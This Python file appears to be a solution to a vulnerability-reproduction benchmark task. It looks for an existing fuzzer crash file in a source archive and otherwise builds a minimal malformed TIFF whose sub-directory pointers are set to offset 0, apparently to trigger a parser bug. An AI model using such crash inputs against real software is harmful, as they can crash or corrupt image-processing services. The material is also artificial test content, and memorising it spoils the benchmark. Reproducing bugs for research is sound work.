import os
import re
import tarfile
from typing import Optional, List, Tuple
import struct


class Solution:
    def _looks_like_tiff(self, data: bytes) -> bool:
        return len(data) >= 8 and (data[:4] == b"II*\x00" or data[:4] == b"MM\x00*")

    def _try_find_in_tree(self, root: str) -> Optional[bytes]:
        prefer_re = re.compile(r"(clusterfuzz|testcase|crash|poc|repro|388571282)", re.IGNORECASE)
        best: Optional[Tuple[int, bytes]] = None

        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 1_000_000:
                    continue

                name = os.path.relpath(path, root)
                if not prefer_re.search(name):
                    continue

                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue

                if not data:
                    continue

                if self._looks_like_tiff(data) or name.lower().endswith((".tif", ".tiff")):
                    cur = (len(data), data)
                    if best is None or cur[0] < best[0]:
                        best = cur

        return None if best is None else best[1]

    def _try_find_in_tar(self, tar_path: str) -> Optional[bytes]:
        prefer_re = re.compile(r"(clusterfuzz|testcase|crash|poc|repro|388571282)", re.IGNORECASE)
        best: Optional[Tuple[int, bytes]] = None

        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 1_000_000:
                        continue
                    name = m.name
                    if not prefer_re.search(name):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        try:
                            f.close()
                        except Exception:
                            pass
                    if not data:
                        continue
                    if self._looks_like_tiff(data) or name.lower().endswith((".tif", ".tiff")):
                        cur = (len(data), data)
                        if best is None or cur[0] < best[0]:
                            best = cur
        except Exception:
            return None

        return None if best is None else best[1]

    def _build_poc_tiff(self) -> bytes:
        # Classic TIFF little-endian, minimal IFD0 plus multiple "offline directory pointer" tags set to offset 0.
        # Tags included:
        #   256 ImageWidth
        #   257 ImageLength
        #   330 SubIFDs
        #   34665 ExifIFD
        #   34853 GPSIFD
        #   40965 InteroperabilityIFD
        entries = [
            (256, 4, 1, 1),
            (257, 4, 1, 1),
            (330, 4, 1, 0),
            (34665, 4, 1, 0),
            (34853, 4, 1, 0),
            (40965, 4, 1, 0),
        ]
        entries.sort(key=lambda x: x[0])

        header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
        ifd = struct.pack("<H", len(entries))
        for tag, typ, cnt, val in entries:
            ifd += struct.pack("<HHII", tag, typ, cnt, val)
        ifd += struct.pack("<I", 0)
        return header + ifd

    def solve(self, src_path: str) -> bytes:
        data: Optional[bytes] = None

        if os.path.isdir(src_path):
            data = self._try_find_in_tree(src_path)
        else:
            data = self._try_find_in_tar(src_path)

        if data is not None:
            return data

        return self._build_poc_tiff()